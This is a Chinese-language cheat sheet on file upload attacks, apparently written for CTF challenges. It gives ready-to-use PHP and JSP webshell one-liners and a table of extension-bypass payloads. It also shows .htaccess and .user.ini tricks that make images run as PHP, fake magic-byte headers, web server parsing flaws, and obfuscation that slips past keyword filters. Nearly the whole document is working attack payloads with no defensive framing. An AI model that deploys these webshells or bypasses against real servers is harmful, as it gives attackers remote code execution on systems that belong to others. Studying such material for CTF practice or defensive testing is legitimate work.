# 文件上传

## 信息收集

- 限制策略：客户端 JS / 服务端 MIME / 服务端扩展名 / 服务端文件头
- 上传后落地路径是否可访问？是否解析？
- 服务端语言：PHP / Java / Node / .NET → 影响 webshell 选择

## PHP webshell 模板

```php
<?php @eval($_POST['c']); ?>          // 蚁剑/冰蝎
<?php system($_GET['c']); ?>           // GET RCE
<?=`$_GET[0]`;?>                       // 短标签
<?php @file_put_contents('s.php',$_POST['x']);?>  // 写马
```

## 扩展名绕过

| 类型 | payload |
|---|---|
| 大小写 | `.PhP`, `.PHp` |
| 列表外 | `.phtml`, `.phar`, `.php3`, `.php5`, `.pht`, `.inc` |
| 双扩展 | `shell.php.jpg`、`shell.jpg.php` |
| 截断（旧 PHP < 5.3） | `shell.php%00.jpg` |
| 配置覆盖 | 上传 `.htaccess` 让 jpg 当 php 解析 |
| `.user.ini` | 同目录 PHP 文件加载额外配置 |

`.htaccess` 例：
```
AddType application/x-httpd-php .jpg
```

`.user.ini` 例：
```
auto_prepend_file=shell.jpg
```

## Content-Type 绕过

```http
Content-Type: image/jpeg

GIF89a
<?php system($_GET['c']); ?>
```
文件名仍 `.php`，前缀加假魔数过部分文件类型检测。

## 服务器解析漏洞

- Apache 多扩展名：`shell.php.xxx` 从右往左识别
- nginx + PHP-FPM `cgi.fix_pathinfo`：`shell.jpg/x.php` 当 PHP
- IIS 6: `shell.asp;.jpg` 截断、`shell.asp/x.jpg` 目录
- IIS 7.5 + FastCGI：`shell.jpg/.php`

## Java 题

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```
- Tomcat：`.jsp / .jspx`，可上传 WAR 包到 `/manager/html`
- WebLogic：构造反序列化 payload

## 内容关键字过滤

- `eval`/`assert`/`system`/`exec` 黑名单 → 用 `\x65val`、`assert($_GET['x'])`、`call_user_func`
- 短标签 `<?=` 替代 `<?php echo`
- 拼接：`$a='sys'.'tem';$a($_GET[0]);`

## 上传后定位

- 通常 `gobuster dir -u http://target/uploads -x php,jpg`
- 看响应 header `Location` 或 JSON 返回
- 文件名变 hash 时尝试 `Content-Disposition: filename="shell.php"; filename*="shell.php"` 或上传时控制

## 二次渲染绕过（高级）

服务端会用 GD 库重新渲染图片销毁 webshell。对策：
- 把 payload 嵌入图片不被覆盖的字节区间
- 直接 `phar://` 触发反序列化（不依赖代码被解析）
- 或者攻击图像处理库本身（ImageMagick 老 CVE）
